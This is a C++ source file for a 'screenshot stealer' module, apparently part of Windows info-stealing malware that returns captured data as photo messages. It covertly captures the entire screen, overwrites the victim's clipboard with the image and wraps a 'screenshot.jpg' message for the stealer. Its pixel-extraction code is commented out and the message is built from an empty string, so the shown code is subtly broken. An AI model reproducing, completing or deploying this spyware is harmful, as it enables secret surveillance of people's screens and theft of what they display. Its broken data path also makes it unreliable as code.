#include "srceenshot_stealer.h"

#include "messages/photo_message.h"

asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
{
    return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
        [](auto completion_handler)
        {
            std::thread([](auto completion_handler)
            {
                int x1, y1, x2, y2, w, h;

                // get screen dimensions
                x1  = GetSystemMetrics(SM_XVIRTUALSCREEN);
                y1  = GetSystemMetrics(SM_YVIRTUALSCREEN);
                x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
                y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN);
                w   = x2 - x1;
                h   = y2 - y1;

                // copy screen to bitmap
                HDC     hScreen = GetDC(NULL);
                HDC     hDC     = CreateCompatibleDC(hScreen);
                HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
                HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
                BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

                // save bitmap to clipboard
                OpenClipboard(NULL);
                EmptyClipboard();
                SetClipboardData(CF_BITMAP, hBitmap);
                CloseClipboard();

                /*
                BITMAP bitmap;
                GetObject(hBitmap, sizeof(bitmap), (LPVOID)&bitmap);

                BITMAPINFO MyBMInfo = {0};
                MyBMInfo.bmiHeader.biSize = sizeof(MyBMInfo.bmiHeader);
                GetDIBits(hDC, hBitmap, 0, 0, NULL, &MyBMInfo, DIB_RGB_COLORS);

                BYTE* lpPixels = new BYTE[MyBMInfo.bmiHeader.biSizeImage];

                MyBMInfo.bmiHeader.biCompression = BI_RGB;

                GetDIBits(hDC, hBitmap, 0, MyBMInfo.bmiHeader.biHeight, (LPVOID)lpPixels, &MyBMInfo, DIB_RGB_COLORS);
*/

                auto to_ret = std::make_unique<photo_message_t>();
                std::string data;
                to_ret->move_to_data_and_set_path(data, "screenshot.jpg");

                // clean up
                SelectObject(hDC, old_obj);
                DeleteDC(hDC);
                ReleaseDC(NULL, hScreen);
                DeleteObject(hBitmap);

                DLOG("screenshot have been done");

                std::move(completion_handler)(std::move(to_ret));
            }, std::move(completion_handler)).detach();
        }, asio::use_awaitable
    );
}
